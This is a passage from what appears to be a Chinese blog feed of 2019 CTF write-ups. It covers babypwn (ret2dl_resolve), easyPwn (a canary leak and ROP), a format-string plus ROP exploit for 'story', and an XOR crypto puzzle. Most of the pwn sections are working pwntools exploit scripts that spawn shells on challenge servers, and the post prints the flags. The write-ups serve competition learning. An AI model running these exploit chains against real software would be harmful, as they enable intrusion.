hex(__libc_start_main)</span><br><span class="line">p = 344;</span><br><span class="line">write(344,"3")</span><br><span class="line">write(345,str(last+0xd))</span><br><span class="line">write(352,str(__libc_start_main % 0x100))</span><br><span class="line">write(353,str((__libc_start_main>>8) % 0x100))</span><br><span class="line">write(354,str((__libc_start_main>>16) % 0x100))</span><br><span class="line">write(355,str((__libc_start_main>>24) % 0x100))</span><br><span class="line">write(356,str((__libc_start_main>>32) % 0x100))</span><br><span class="line">write(357,str((__libc_start_main>>40) % 0x100))</span><br><span class="line">write(360,str("176"))</span><br><span class="line">write(361,str(last+0x8))</span><br><span class="line">write(362,str((base_addr>>16) % 0x100))</span><br><span class="line">write(363,str((base_addr>>24) % 0x100))</span><br><span class="line">write(364,str((base_addr>>32) % 0x100))</span><br><span class="line">write(365,str((base_addr>>40) % 0x100))</span><br><span class="line">write(368,str("101"))</span><br><span class="line">write(369,str(last+0xA))</span><br><span class="line">write(370,str((base_addr>>16) % 0x100))</span><br><span class="line">write(371,str((base_addr>>24) % 0x100))</span><br><span class="line">write(372,str((base_addr>>32) % 0x100))</span><br><span class="line">write(373,str((base_addr>>40) % 0x100))</span><br><span class="line">for i in range(1,14):</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recv()</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recv()</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline("no")</span><br><span class="line">_libc = u64(sh.recv(6)+"\x00\x00")</span><br><span class="line">system_addr = _libc + 0x24c50 +0x1B</span><br><span class="line">bin_sh = _libc + 0x16c617</span><br><span class="line">print "[+] libc : " + hex(_libc)</span><br><span class="line">print "[+] system_addr:" + hex(system_addr)</span><br><span class="line">print "[+] bin_sh:" + hex(bin_sh)</span><br><span class="line">sh.sendline("wjs")</span><br><span class="line">p = 344;</span><br><span class="line">for i in range(1,24):</span><br><span class="line">    write(0,"0")</span><br><span class="line">write(344,"3")</span><br><span class="line">write(345,str(last+0xd))</span><br><span class="line">write(352,str(bin_sh % 0x100))</span><br><span class="line">write(353,str((bin_sh>>8) % 0x100))</span><br><span class="line">write(354,str((bin_sh>>16) % 0x100))</span><br><span class="line">write(355,str((bin_sh>>24) % 0x100))</span><br><span class="line">write(356,str((bin_sh>>32) % 0x100))</span><br><span class="line">write(357,str((bin_sh>>40) % 0x100))</span><br><span class="line">write(358,str((bin_sh>>48) % 0x100))</span><br><span class="line">write(360,str(system_addr % 0x100))</span><br><span class="line">write(361,str((system_addr>>8) % 0x100))</span><br><span class="line">write(362,str((system_addr>>16) % 0x100))</span><br><span class="line">write(363,str((system_addr>>24) % 0x100))</span><br><span class="line">write(364,str((system_addr>>32) % 0x100))</span><br><span class="line">write(365,str((system_addr>>40) % 0x100))</span><br><span class="line">write(366,str((system_addr>>48) % 0x100))</span><br><span class="line">sh.sendline("no")</span><br><span class="line">print sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="执行结果如下"><a href="#执行结果如下" class="headerlink" title="执行结果如下"></a>执行结果如下</h3><p><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/8.png" class="lazyload"></a></p><h2 id="0x02-babypwn"><a href="#0x02-babypwn" class="headerlink" title="0x02 babypwn"></a>0x02 babypwn</h2><p><a href="babypwn">babypwn</a><br>将程序导入IDA，发现没有put，也没有write，简单说就是没有输出的函数<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/9.png" class="lazyload"></a></p><p>所以这题考察dl_resolve<br>可以考虑使用roputils库方便拿到shell。<br>就是重定位符号表，因为第一次调用函数的时候，并不是直接跳转到libc空间中的函数，而是在这个函数被调用了，才去把这个函数在libc的地址放到GOT表中。接下来，会通过两次push，最后跳到libc的_dl_runtime_resolve去执行。_dl_runtime_resolve的目的，是根据push 的两个参数导出函数的地址，然后放到相应的GOT表，并且调用它。<br>作为攻击者我们需要做的就是控制reloc_arg从而使dl_runtime_resolve将函数重定位到我们能控制的地方。</p><p>溢出思路：将bss作为栈，将push的参数存在里面，且要注意控制leave和ebp，由于我们使用roputils库，可以不用过于考虑这些问题，因为roputils库可以自动生成ROP，我们只需要传入bss地址，还有溢出后ret的偏移，还有可以重复溢出的函数，就可以构造出我们需要的ROP，然后构造system函数，并将bss的binsh传入system便可以拿到shell</p><p>在0ctf比赛中出现过类似的题目，思路与这题类似<br>接下来附上exp</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">sys.path.append('./roputils')</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">from hashlib import sha256</span><br><span class="line">fpath = './pwn'</span><br><span class="line">offset = 44</span><br><span class="line">readplt = 0x08048390</span><br><span class="line">bss = 0x0804A040</span><br><span class="line">vulFunc = 0x0804852D</span><br><span class="line">p = remote('39.97.228.196',60005)</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">rop = roputils.ROP(fpath)</span><br><span class="line">addr_bss = rop.section('.bss')</span><br><span class="line">buf1 = 'A' * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line">buf2 = '/bin/sh\0'</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, 'system')</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line">buf3 = 'A' * offset + rop.dl_resolve_call(addr_bss+20, addr_bss)# + 'a'*30</span><br><span class="line">p.sendline(buf3)</span><br><span class="line">def getReloc(elf, base):</span><br><span class="line">    jmprel = elf.dynamic('JMPREL')</span><br><span class="line">    relent = elf.dynamic('RELENT')</span><br><span class="line">    addr_reloc, padlen_reloc = elf.align(base, jmprel, relent)</span><br><span class="line">    reloc_offset = addr_reloc - jmprel</span><br><span class="line">    return reloc_offset</span><br><span class="line">plt0 = 0x080482F0</span><br><span class="line">print 'plt0 = %r' %(rop.plt())</span><br><span class="line">reloc_offset = getReloc(rop, addr_bss+20)</span><br><span class="line">buf3 = 'A'*44+p32(plt0) + p32(reloc_offset) + p32(vulFunc) + p32(addr_bss)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure></div><h3 id="执行结果-1"><a href="#执行结果-1" class="headerlink" title="执行结果"></a>执行结果</h3><p><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/10.png" class="lazyload"></a></p><h1 id="reverse篇"><a href="#reverse篇" class="headerlink" title="reverse篇"></a>reverse篇</h1><p>0x01 easyGo<br><a href="easyGo.rar">easyGo.rar</a><br>一开始用IDA直接调试，发现汇编跳来跳去，而且看不到ascii码，决定使用edb进行调试<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/11.png" class="lazyload"></a><br>F8步进直到0x42ab60出现崩溃，然后再0x42ab60步入看看<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/12.png" class="lazyload"></a><br>接着我们又在0x42abbd崩溃<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/13.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/13.png" class="lazyload"></a><br>于是我们直接重载程序，然后跳转到0x42abbd，并且步入<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/14.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/14.png" class="lazyload"></a><br>只要崩溃我们就重载然后跳转到该位置然后步入0x409950<br>慢慢单步，看到一些字符串<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/15.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/15.png" class="lazyload"></a><br>但是好像没有用<br>最后在下面的地址0x43c750卡死，但是不是崩溃<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/16.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/16.png" class="lazyload"></a><br>并且提示输出flag，那可能里面就存在输入文本和flag比较的过程<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/17.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/17.png" class="lazyload"></a><br>继续0x42c750卡死<br>重载程序，然后直接跳转到0x42c750<br>一直重复操作 0x42c7e0   0x42f810  0x42e750<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/18.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/18.png" class="lazyload"></a><br>一直到0x44f380<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/19.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/19.png" class="lazyload"></a><br>发现call rax，我们记录一下0x495150，然后直接跳过去<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/20.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/20.png" class="lazyload"></a><br>发现是循环直接在0x495168    F4运行到该位置<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/21.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/21.png" class="lazyload"></a><br>发现执行 call 0x4886b0时有输出但是没有卡死程序<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/22.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/22.png" class="lazyload"></a><br>然后又发现卡死，其实是叫我们输入flag<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/23.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/23.png" class="lazyload"></a><br>输入后提示错误<br>然后多按几次回车<br>突然发现可以继续单步，然后继续单步，发现flag<br><a href="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/24.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/24/CTF-2019%E5%9B%BD%E8%B5%9B%E9%A2%84%E9%80%89%E8%B5%9B/24.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000000c0:0009c090|66 6c 61 67 7b 39 32 30 39 34 64 61 66 2d 33 33|flag{92094daf-33|</span><br><span class="line">000000c0:0009c0a0|63 39 2d 34 33 31 65 2d 61 38 35 61 2d 38 62 66|c9-431e-a85a-8bf|</span><br><span class="line">000000c0:0009c0b0|62 64 35 64 66 39 38 61 64 7d                  |bd5df98ad}      |</span><br></pre></td></tr></tbody></table></figure></div><p>flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-德军的密码</title>
      <link href="/2019/04/24/CTF-JarvisOJ-Basic-%E5%BE%B7%E5%86%9B%E7%9A%84%E5%AF%86%E7%A0%81/"/>
      <url>/2019/04/24/CTF-JarvisOJ-Basic-%E5%BE%B7%E5%86%9B%E7%9A%84%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为"><a href="#已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为" class="headerlink" title="已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为"></a>已知将一个flag以一种加密形式为使用密钥进行加密，使用密钥WELCOMETOCFF加密后密文为</h3><h3 id="000000000000000000000000000000000000000000000000000101110000110001000000101000000001-请分析出flag。Flag为12位大写字母"><a href="#000000000000000000000000000000000000000000000000000101110000110001000000101000000001-请分析出flag。Flag为12位大写字母" class="headerlink" title="000000000000000000000000000000000000000000000000000101110000110001000000101000000001 请分析出flag。Flag为12位大写字母"></a>000000000000000000000000000000000000000000000000000101110000110001000000101000000001 请分析出flag。Flag为12位大写字母</h3><h4 id="因为WELCOMETOCFF转化为二进制和上述密文长度相同，猜测是异或"><a href="#因为WELCOMETOCFF转化为二进制和上述密文长度相同，猜测是异或" class="headerlink" title="因为WELCOMETOCFF转化为二进制和上述密文长度相同，猜测是异或"></a>因为WELCOMETOCFF转化为二进制和上述密文长度相同，猜测是异或</h4><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">crypto = '000000000000000000000000000000000000000000000000000000000001011100000110000100000001010000000001'</span><br><span class="line">key     = '010101110100010101001100010000110100111101001101010001010101010001001111010000110100011001000110'</span><br><span class="line">c = ''</span><br><span class="line">str = ''</span><br><span class="line">for i in range(len(crypto)):</span><br><span class="line">if (key[i] == crypto[i]):</span><br><span class="line">c+='0'</span><br><span class="line">else:</span><br><span class="line">c+='1'</span><br><span class="line">print(c);</span><br><span class="line">for i in range(0,12):</span><br><span class="line">str += chr(int(c[i*8:i*8+8],2))</span><br><span class="line">print str</span><br></pre></td></tr></tbody></table></figure></div><p>执行得到flag<br>flag{WELCOMECISRG}</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Baidu-Pwn-easyPwn</title>
      <link href="/2019/04/19/CTF-Baidu-Pwn-easyPwn/"/>
      <url>/2019/04/19/CTF-Baidu-Pwn-easyPwn/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="0x01-easyPwn"><a href="#0x01-easyPwn" class="headerlink" title="0x01 easyPwn"></a>0x01 easyPwn</h2><h3 id="文件下载easypwn"><a href="#文件下载easypwn" class="headerlink" title="文件下载easypwn"></a>文件下载<a href="easypwn">easypwn</a></h3><p>将程序导入ida，看到read printf read，这是一个很明显的漏洞，<br><a href="/2019/04/19/CTF-Baidu-Pwn-easyPwn/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/19/CTF-Baidu-Pwn-easyPwn/1.png" class="lazyload"></a></p><p>用checksec检查一下保护<br><a href="/2019/04/19/CTF-Baidu-Pwn-easyPwn/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/19/CTF-Baidu-Pwn-easyPwn/2.png" class="lazyload"></a><br>发现只有pie没有开<br>若要溢出数据，必须要先知道canary的数据</p><h3 id="溢出思路：第一个read可以获得canary的数据，然后第二个read可以溢出libc版本，最后跳转回main函数，然后找到bin-sh和system的地址构造ROP即可"><a href="#溢出思路：第一个read可以获得canary的数据，然后第二个read可以溢出libc版本，最后跳转回main函数，然后找到bin-sh和system的地址构造ROP即可" class="headerlink" title="溢出思路：第一个read可以获得canary的数据，然后第二个read可以溢出libc版本，最后跳转回main函数，然后找到bin_sh和system的地址构造ROP即可"></a>溢出思路：第一个read可以获得canary的数据，然后第二个read可以溢出libc版本，最后跳转回main函数，然后找到bin_sh和system的地址构造ROP即可</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level="debug"</span><br><span class="line">#sh = process("./easypwn")</span><br><span class="line">#nc 106.75.2.53 10002</span><br><span class="line">sh = remote("106.75.2.53",10002)</span><br><span class="line">elf = ELF("easypwn")</span><br><span class="line">libc = ELF("libc6_2.27-3ubuntu1_amd64.so")</span><br><span class="line">sh.recv()</span><br><span class="line">#--------------------- leak Canary</span><br><span class="line">payload = 'a' * 72</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil('a'*72+'\n')</span><br><span class="line">canary = u64("\x00"+sh.recv(7))</span><br><span class="line">print hex(canary)</span><br><span class="line">#----------------------</span><br><span class="line">__libc_start_main_got = elf.got['__libc_start_main']</span><br><span class="line">puts_addr = elf.plt['puts']</span><br><span class="line">pop_rdi_ret = 0x00000000004007f3</span><br><span class="line">#----------------------</span><br><span class="line">payload = 'a' * 72 + p64(canary) + "a"*8 + p64(pop_rdi_ret) + p64(__libc_start_main_got) + p64(puts_addr) + p64(elf.symbols['main'])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil('Goodbye!See you again!\n')</span><br><span class="line">_libc_start_main = u64(sh.recv(6)+'\x00\x00')</span><br><span class="line">base = libc.symbols['__libc_start_main'] - _libc_start_main</span><br><span class="line">system_addr = libc.symbols['system'] - base</span><br><span class="line">bin_sh = next(libc.search("/bin/sh\x00"))-base</span><br><span class="line">print hex(_libc_start_main)</span><br><span class="line">sh.sendline('a'*72+'\n')</span><br><span class="line">sh.sendline('a'*72 + p64(canary)+'a'*8+p64(pop_rdi_ret)+p64(bin_sh)+p64(system_addr+0x1B))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年4月西湖杯-Pwn</title>
      <link href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/"/>
      <url>/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="0x01-story"><a href="#0x01-story" class="headerlink" title="0x01 story"></a>0x01 story</h2><p>导入ida，如下<br>Main函数<br><a href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/1.png" class="lazyload"></a><br>sub_400915函数<br><a href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/2.png" class="lazyload"></a><br>sub_4009A0函数<br><a href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/3.png" class="lazyload"></a><br>inputData函数<br><a href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/4.png" class="lazyload"></a></p><p>checksec 检查一下发现，大部分保护都开启了<br><a href="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/04/17/CTF-2019%E5%B9%B44%E6%9C%88%E8%A5%BF%E6%B9%96%E6%9D%AF-Pwn/5.png" class="lazyload"></a></p><p>溢出思路：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">printf("Please Tell Your ID:");</span><br><span class="line">inputData((__int64)&s, 50uLL);</span><br><span class="line">v0 = strdup(&s);</span><br><span class="line">printf("Hello ", 50LL);</span><br><span class="line">printf(&s);</span><br><span class="line">putchar('\n');</span><br><span class="line">return v0;</span><br></pre></td></tr></tbody></table></figure></div><p>首先我们可以看到格式化输出漏洞，通过此漏洞我们可以拿到__libc_start_main的got，从而溢出libc版本，与此同时，我们可以用过该漏洞拿到canary的值<br>第二个read，我们大于128的数值，使得inputData可写的长度变成1024<br>第三次read，然后我们可以构造ROP，跳转到libc空间，执行system(“/bin/sh\x00”)拿到shell</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python </span><br><span class="line">from pwn import *</span><br><span class="line">context.arch="amd64"</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">sh = process("./story")</span><br><span class="line">elf = ELF("story")</span><br><span class="line">libc = ELF("libc6_2.27-3ubuntu1_amd64.so")</span><br><span class="line">sh.recv();</span><br><span class="line">#----------------------------------------------</span><br><span class="line">__libc_start_main_got = elf.got['__libc_start_main']</span><br><span class="line">libc_system_addr = libc.symbols['system']</span><br><span class="line">pop_rdi_ret = 0x0000000000400bd3</span><br><span class="line">print hex(__libc_start_main_got)</span><br><span class="line">#----------------------------------------------</span><br><span class="line">payload = "%15$p" + "AAAAAAAAAAA" + "%13$s" + "BBB" + p64(__libc_start_main_got)*3</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil("Hello ")</span><br><span class="line">#----------------------------------------------</span><br><span class="line">canary = int(sh.recvuntil("AAAAAAAAAAA",True),16)</span><br><span class="line">__libc_start_main_addr = u64(sh.recvuntil("BBB",True) + "\x00\x00")</span><br><span class="line">base = __libc_start_main_got - __libc_start_main_addr</span><br><span class="line">print "diff = " + hex(libc.symbols['system']-libc.symbols['__libc_start_main'])</span><br><span class="line">_libc_system_addr = __libc_start_main_addr + 0x2d990 </span><br><span class="line">libc_bin_sh_addr = __libc_start_main_addr + 0x1923ea</span><br><span class="line">print "__libc_start_main = " + hex(__libc_start_main_addr)</span><br><span class="line">print "canary = " + hex(canary)</span><br><span class="line">print "system_addr = " + hex(_libc_system_addr)</span><br><span class="line">print "bin_sh_addr = " + hex(libc_bin_sh_addr)</span><br><span class="line">#----------------------------------------------</span><br><span class="line">sh.recvuntil("Tell me the size of your story:\n")</span><br><span class="line">sh.sendline("200")</span><br><span class="line">sh.recvuntil("ak your story:\n")</span><br><span class="line">payload = "a" * (0x90 - 0x8) + p64(canary)*2  + p64(pop_rdi_ret) + p64(libc_bin_sh_addr) + p64(_libc_system_addr+0x1B)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年4月DDCTF</title>
